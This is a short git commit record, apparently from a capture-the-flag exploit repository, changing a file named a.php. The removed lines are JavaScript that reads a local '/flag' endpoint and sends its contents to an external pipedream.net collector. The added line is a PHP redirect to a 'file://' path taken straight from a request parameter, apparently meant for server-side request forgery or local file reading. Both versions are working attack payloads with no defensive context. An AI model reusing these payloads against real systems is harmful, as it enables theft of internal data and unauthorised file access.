1cf4978e21c2d763b967bb2ffb19fb1c3e6774a6
Little-Mu <101054117+Little-Mu@users.noreply.github.com>
2022-10-09 13:00:28 +0200

    Update a.php

--- a.php
+++ a.php
@@ -1,7 +1,1 @@
-function reqListener () {
-  fetch("https://ennv0phuqv24d.x.pipedream.net/?"+this.responseText);
-}
-const req = new XMLHttpRequest();
-req.addEventListener("load", reqListener);
-req.open("GET", "http://127.0.0.1/flag");
-req.send();
+<?php header('location:file://'.$_REQUEST['url']); ?>
